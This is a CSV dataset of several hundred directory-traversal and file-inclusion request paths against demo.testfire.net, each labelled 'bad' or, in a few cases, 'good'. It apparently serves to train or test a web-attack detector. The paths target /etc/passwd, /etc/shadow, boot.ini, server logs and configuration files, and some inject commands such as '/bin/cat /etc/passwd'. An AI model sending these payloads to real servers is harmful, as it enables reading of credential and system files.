path,content,host,class_flag
//..\\..\\..\\..\\..\\..\\..\\boot.ini,,demo.testfire.net,['bad']
//..\\..\\..\\..\\..\\..\\..\\..\\boot.ini,,demo.testfire.net,['bad']
//..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\..\\\..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\..\\\..\\\..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\..\\\..\\\..\\\..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\boot.ini,,demo.testfire.net,['bad']
//./\/././\/./boot.ini,,demo.testfire.net,['bad']
//./\/./boot.ini,,demo.testfire.net,['bad']
//./\/././\/././\/./boot.ini,,demo.testfire.net,['bad']
//./\/././\/././\/././\/./boot.ini,,demo.testfire.net,['bad']
//./\/././\/././\/././\/././\/./boot.ini,,demo.testfire.net,['bad']
//./\/././\/././\/././\/././\/././\/./boot.ini,,demo.testfire.net,['bad']
//./\/././\/././\/././\/././\/././\/././\/./boot.ini,,demo.testfire.net,['bad']
//./\/././\/././\/././\/././\/././\/././\/././\/./boot.ini,,demo.testfire.net,['bad']
//.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../boot.ini,,demo.testfire.net,['bad']
//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//./../boot.ini,,demo.testfire.net,['bad']
//./.././../boot.ini,,demo.testfire.net,['bad']
//./.././.././../boot.ini,,demo.testfire.net,['bad']
//./.././.././.././../boot.ini,,demo.testfire.net,['bad']
//./.././.././.././.././../boot.ini,,demo.testfire.net,['bad']
//./.././.././.././.././.././../boot.ini,,demo.testfire.net,['bad']
//./.././.././.././.././.././.././../boot.ini,,demo.testfire.net,['bad']
//./.././.././.././.././.././.././.././../boot.ini,,demo.testfire.net,['bad']
//.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\.\..\.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\.\..\.\..\.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini,,demo.testfire.net,['bad']
//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//.//..//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini,,demo.testfire.net,['bad']
//.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,,demo.testfire.net,['bad']
//../boot.ini,,demo.testfire.net,['bad']
//../..//boot.ini,,demo.testfire.net,['bad']
//../..//../boot.ini,,demo.testfire.net,['bad']
//../..//../..//boot.ini,,demo.testfire.net,['bad']
//../..//../..//../boot.ini,,demo.testfire.net,['bad']
//../..//../..//../..//boot.ini,,demo.testfire.net,['bad']
//../..//../..//../..//../boot.ini,,demo.testfire.net,['bad']
//../..//../..//../..//../..//boot.ini,,demo.testfire.net,['bad']
//..\boot.ini,,demo.testfire.net,['bad']
//..\..\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\..\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\..\..\\boot.ini,,demo.testfire.net,['bad']
//..///boot.ini,,demo.testfire.net,['bad']
//../..///boot.ini,,demo.testfire.net,['bad']
//../..//..///boot.ini,,demo.testfire.net,['bad']
//../..//../..///boot.ini,,demo.testfire.net,['bad']
//../..//../..//..///boot.ini,,demo.testfire.net,['bad']
//../..//../..//../..///boot.ini,,demo.testfire.net,['bad']
//../..//../..//../..//..///boot.ini,,demo.testfire.net,['bad']
//../..//../..//../..//../..///boot.ini,,demo.testfire.net,['bad']
//..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\..\\\boot.ini,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\..\..\\\boot.ini,,demo.testfire.net,['bad']
/C:\WINDOWS\win.ini../../../../../../../../../../../../etc/hosts ,,demo.testfire.net,['bad']
/../../../../../../../../../../../../etc/hosts,,demo.testfire.net,['bad']
/../../boot.ini,,demo.testfire.net,['bad']
//../../../../../../../../*,,demo.testfire.net,['bad']
/../../../../../../../../../../../../etc/passwd ,,demo.testfire.net,['bad']
/../../../../../../../../../../../../etc/passwd,,demo.testfire.net,['bad']
/../../../../../../../../../../../../etc/shadow ,,demo.testfire.net,['bad']
/../../../../../../../../../../../../etc/shadow,,demo.testfire.net,['bad']
//../../../../../../../../../../etc/passwd^^,,demo.testfire.net,['bad']
//../../../../../../../../../../etc/shadow^^,,demo.testfire.net,['bad']
//../../../../../../../../../../etc/passwd,,demo.testfire.net,['bad']
//../../../../../../../../../../etc/shadow,,demo.testfire.net,['bad']
//./././././././././././etc/passwd,,demo.testfire.net,['bad']
//./././././././././././etc/shadow,,demo.testfire.net,['bad']
/\..\..\..\..\..\..\..\..\..\..\etc\passwd,,demo.testfire.net,['bad']
/\..\..\..\..\..\..\..\..\..\..\etc\shadow,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\..\..\etc\passwd,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\..\..\etc\shadow,,demo.testfire.net,['bad']
//..\../..\../..\../..\../..\../..\../etc/passwd,,demo.testfire.net,['bad']
//..\../..\../..\../..\../..\../..\../etc/shadow,,demo.testfire.net,['bad']
/.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,,demo.testfire.net,['bad']
/.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,,demo.testfire.net,['bad']
/\..\..\..\..\..\..\..\..\..\..\etc\passwd ,,demo.testfire.net,['bad']
/\..\..\..\..\..\..\..\..\..\..\etc\shadow ,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\..\..\etc\passwd ,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\..\..\etc\shadow ,,demo.testfire.net,['bad']
"/
/bin/cat /etc/passwd",,demo.testfire.net,['bad']
"/
/bin/cat /etc/shadow",,demo.testfire.net,['bad']
/ /etc/passwd ,,demo.testfire.net,['bad']
/ /etc/shadow ,,demo.testfire.net,['bad']
/ ../../../../../../etc/shadow,,demo.testfire.net,['bad']
/ ../../../../../../etc/passwd,,demo.testfire.net,['bad']
//../../../../../../../../../../../etc/passwd .jpg,,demo.testfire.net,['bad']
//../../../../../../../../../../../etc/passwd .html,,demo.testfire.net,['bad']
//../../../../../../../../../../etc/passwd,,demo.testfire.net,['bad']
//../../../../../../../../../../etc/shadow,,demo.testfire.net,['bad']
/%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\.. ,,demo.testfire.net,['good']
//%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\.. ,,demo.testfire.net,['good']
//%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..winnt/desktop.ini,,demo.testfire.net,['bad']
/\\&apos;/bin/cat /etc/passwd\\&apos;,,demo.testfire.net,['bad']
/\\&apos;/bin/cat /etc/shadow\\&apos;,,demo.testfire.net,['bad']
/../../../../../../../../conf/server.xml,,demo.testfire.net,['bad']
//../../../../../../../../bin/id|,,demo.testfire.net,['bad']
/C:/inetpub/wwwroot/global.asa,,demo.testfire.net,['bad']
/C:\inetpub\wwwroot\global.asa,,demo.testfire.net,['bad']
/C:/boot.ini,,demo.testfire.net,['bad']
/C:\boot.ini,,demo.testfire.net,['bad']
/../../../../../../../../../../../../localstart.asp ,,demo.testfire.net,['bad']
/../../../../../../../../../../../../localstart.asp,,demo.testfire.net,['bad']
/../../../../../../../../../../../../boot.ini ,,demo.testfire.net,['bad']
/../../../../../../../../../../../../boot.ini,,demo.testfire.net,['bad']
//./././././././././././boot.ini,,demo.testfire.net,['bad']
//.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,,demo.testfire.net,['bad']
/\..\..\..\..\..\..\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//../../../../../../../../../../../boot.ini ,,demo.testfire.net,['bad']
//../../../../../../../../../../../boot.ini,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\..\..\boot.ini ,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\..\..\boot.ini,,demo.testfire.net,['bad']
//../../../../../../../../../../../boot.ini .html,,demo.testfire.net,['bad']
//..\../..\../..\../..\../..\../..\../boot.ini,,demo.testfire.net,['bad']
//.../.../.../.../.../,,demo.testfire.net,['bad']
//../../../../../../../../../../../boot.ini .jpg,,demo.testfire.net,['bad']
//../../../../../../../../../../boot.ini,,demo.testfire.net,['bad']
//..././..././..././..././..././..././..././..././boot.ini,,demo.testfire.net,['bad']
//..././..././..././..././..././..././..././..././boot.ini ,,demo.testfire.net,['bad']
//..././..././..././..././..././..././..././..././etc/passwd,,demo.testfire.net,['bad']
//..././..././..././..././..././..././..././..././etc/passwd ,,demo.testfire.net,['bad']
//apache/logs/error.log ,,demo.testfire.net,['bad']
//apache/logs/access.log ,,demo.testfire.net,['bad']
//apache/logs/error.log ,,demo.testfire.net,['bad']
//apache/logs/access.log ,,demo.testfire.net,['bad']
//apache/logs/error.log ,,demo.testfire.net,['bad']
//apache/logs/access.log ,,demo.testfire.net,['bad']
//etc/httpd/logs/acces_log ,,demo.testfire.net,['bad']
//etc/httpd/logs/acces.log ,,demo.testfire.net,['bad']
//etc/httpd/logs/error_log ,,demo.testfire.net,['bad']
//etc/httpd/logs/error.log ,,demo.testfire.net,['bad']
//var/www/logs/access_log ,,demo.testfire.net,['bad']
//var/www/logs/access.log ,,demo.testfire.net,['bad']
//usr/local/apache/logs/access_log ,,demo.testfire.net,['bad']
//usr/local/apache/logs/access.log ,,demo.testfire.net,['bad']
//var/log/apache/access_log ,,demo.testfire.net,['bad']
//var/log/apache/access.log ,,demo.testfire.net,['bad']
//var/log/apache2/access.log ,,demo.testfire.net,['bad']
//var/log/access_log ,,demo.testfire.net,['bad']
//var/log/access.log ,,demo.testfire.net,['bad']
//var/log/apache2/access_log ,,demo.testfire.net,['bad']
//var/www/logs/error_log ,,demo.testfire.net,['bad']
//var/www/logs/error.log ,,demo.testfire.net,['bad']
//usr/local/apache/logs/error_log ,,demo.testfire.net,['bad']
//usr/local/apache/logs/error.log ,,demo.testfire.net,['bad']
//var/log/apache/error_log ,,demo.testfire.net,['bad']
//var/log/apache2/error_log ,,demo.testfire.net,['bad']
//var/log/apache/error.log ,,demo.testfire.net,['bad']
//var/log/apache2/error.log ,,demo.testfire.net,['bad']
//var/log/error_log ,,demo.testfire.net,['bad']
//var/log/error.log ,,demo.testfire.net,['bad']
//..\..\\..\..\\..\..\\..\..\\\/etc/passwd,,demo.testfire.net,['bad']
//etc/shadow,,demo.testfire.net,['bad']
//etc/shadow~,,demo.testfire.net,['bad']
//etc/hosts,,demo.testfire.net,['bad']
//etc/motd,,demo.testfire.net,['bad']
//etc/apache/apache.conf,,demo.testfire.net,['bad']
//etc/fstab,,demo.testfire.net,['bad']
//etc/apache2/apache2.conf,,demo.testfire.net,['bad']
//etc/apache/httpd.conf,,demo.testfire.net,['bad']
//etc/httpd/conf/httpd.conf,,demo.testfire.net,['bad']
//etc/apache2/httpd.conf,,demo.testfire.net,['bad']
//etc/apache2/sites-available/default,,demo.testfire.net,['bad']
//etc/mysql/my.cnf,,demo.testfire.net,['bad']
//etc/my.cnf,,demo.testfire.net,['bad']
//etc/sysconfig/network-scripts/ifcfg-eth0,,demo.testfire.net,['bad']
//etc/redhat-release,,demo.testfire.net,['bad']
//etc/httpd/conf.d/php.conf,,demo.testfire.net,['bad']
//etc/pam.d/proftpd,,demo.testfire.net,['bad']
//var/www/config.php,,demo.testfire.net,['bad']
//etc/phpmyadmin/config.inc.php,,demo.testfire.net,['bad']
//etc/httpd/logs/error_log,,demo.testfire.net,['bad']
//etc/httpd/logs/error.log,,demo.testfire.net,['bad']
//etc/httpd/logs/access_log,,demo.testfire.net,['bad']
//etc/httpd/logs/access.log,,demo.testfire.net,['bad']
//var/log/apache/error_log,,demo.testfire.net,['bad']
//var/log/apache/error.log,,demo.testfire.net,['bad']
//var/log/apache/access_log,,demo.testfire.net,['bad']
//var/log/apache/access.log,,demo.testfire.net,['bad']
//var/log/apache2/error_log,,demo.testfire.net,['bad']
//var/log/apache2/error.log,,demo.testfire.net,['bad']
//var/log/apache2/access_log,,demo.testfire.net,['bad']
//var/log/apache2/access.log,,demo.testfire.net,['bad']
//var/www/logs/error_log,,demo.testfire.net,['bad']
//var/www/logs/error.log,,demo.testfire.net,['bad']
//var/www/logs/access_log,,demo.testfire.net,['bad']
//var/www/logs/access.log,,demo.testfire.net,['bad']
//usr/local/apache/logs/error_log,,demo.testfire.net,['bad']
//usr/local/apache/logs/error.log,,demo.testfire.net,['bad']
//usr/local/apache/logs/access_log,,demo.testfire.net,['bad']
//usr/local/apache/logs/access.log,,demo.testfire.net,['bad']
//var/log/error_log,,demo.testfire.net,['bad']
//var/log/error.log,,demo.testfire.net,['bad']
//var/log/access_log,,demo.testfire.net,['bad']
//var/log/access.log,,demo.testfire.net,['bad']
//etc/group,,demo.testfire.net,['bad']
//etc/security/group,,demo.testfire.net,['bad']
//etc/security/passwd,,demo.testfire.net,['bad']
//etc/security/user,,demo.testfire.net,['bad']
//etc/security/environ,,demo.testfire.net,['bad']
//etc/security/limits,,demo.testfire.net,['bad']
//usr/lib/security/mkuser.default,,demo.testfire.net,['bad']
//apache/logs/access.log,,demo.testfire.net,['bad']
//apache/logs/error.log,,demo.testfire.net,['bad']
//etc/httpd/logs/acces_log,,demo.testfire.net,['bad']
//etc/httpd/logs/acces.log,,demo.testfire.net,['bad']
//var/log/httpd/access_log,,demo.testfire.net,['bad']
//var/log/httpd/error_log,,demo.testfire.net,['bad']
//apache2/logs/error.log,,demo.testfire.net,['bad']
//apache2/logs/access.log,,demo.testfire.net,['bad']
//logs/error.log,,demo.testfire.net,['good']
//logs/access.log,,demo.testfire.net,['good']
//usr/local/apache2/logs/access_log,,demo.testfire.net,['bad']
//usr/local/apache2/logs/access.log,,demo.testfire.net,['bad']
//usr/local/apache2/logs/error_log,,demo.testfire.net,['bad']
//usr/local/apache2/logs/error.log,,demo.testfire.net,['bad']
//var/log/httpd/access.log,,demo.testfire.net,['bad']
//var/log/httpd/error.log,,demo.testfire.net,['bad']
//opt/lampp/logs/access_log,,demo.testfire.net,['bad']
//opt/lampp/logs/error_log,,demo.testfire.net,['bad']
//opt/xampp/logs/access_log,,demo.testfire.net,['bad']
//opt/xampp/logs/error_log,,demo.testfire.net,['bad']
//opt/lampp/logs/access.log,,demo.testfire.net,['bad']
//opt/lampp/logs/error.log,,demo.testfire.net,['bad']
//opt/xampp/logs/access.log,,demo.testfire.net,['bad']
//opt/xampp/logs/error.log,,demo.testfire.net,['bad']
/C:\ProgramFiles\ApacheGroup\Apache\logs\access.log,,demo.testfire.net,['bad']
/C:\ProgramFiles\ApacheGroup\Apache\logs\error.log,,demo.testfire.net,['bad']
//usr/local/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/etc/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/apache/httpd.conf,,demo.testfire.net,['bad']
//etc/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/apache2/httpd.conf,,demo.testfire.net,['bad']
//usr/local/httpd/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/etc/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/etc/httpd/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/apps/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//usr/local/apps/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//etc/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//etc/http/conf/httpd.conf,,demo.testfire.net,['bad']
//etc/httpd/httpd.conf,,demo.testfire.net,['bad']
//etc/http/httpd.conf,,demo.testfire.net,['bad']
//etc/httpd.conf,,demo.testfire.net,['bad']
//opt/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//opt/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//var/www/conf/httpd.conf,,demo.testfire.net,['bad']
//private/etc/httpd/httpd.conf,,demo.testfire.net,['bad']
//private/etc/httpd/httpd.conf.default,,demo.testfire.net,['bad']
//Volumes/webBackup/opt/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//Volumes/webBackup/private/etc/httpd/httpd.conf,,demo.testfire.net,['bad']
//Volumes/webBackup/private/etc/httpd/httpd.conf.default,,demo.testfire.net,['bad']
/C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf,,demo.testfire.net,['bad']
/C:\ProgramFiles\xampp\apache\conf\httpd.conf,,demo.testfire.net,['bad']
/C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf,,demo.testfire.net,['bad']
//usr/local/php/httpd.conf.php,,demo.testfire.net,['bad']
//usr/local/php4/httpd.conf.php,,demo.testfire.net,['bad']
//usr/local/php5/httpd.conf.php,,demo.testfire.net,['bad']
//usr/local/php/httpd.conf,,demo.testfire.net,['bad']
//usr/local/php4/httpd.conf,,demo.testfire.net,['bad']
//usr/local/php5/httpd.conf,,demo.testfire.net,['bad']
//Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf,,demo.testfire.net,['bad']
//Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf,,demo.testfire.net,['bad']
//Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf,,demo.testfire.net,['bad']
//Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php,,demo.testfire.net,['bad']
//Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php,,demo.testfire.net,['bad']
//Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php,,demo.testfire.net,['bad']
//usr/local/etc/apache/vhosts.conf,,demo.testfire.net,['bad']
//etc/php.ini,,demo.testfire.net,['bad']
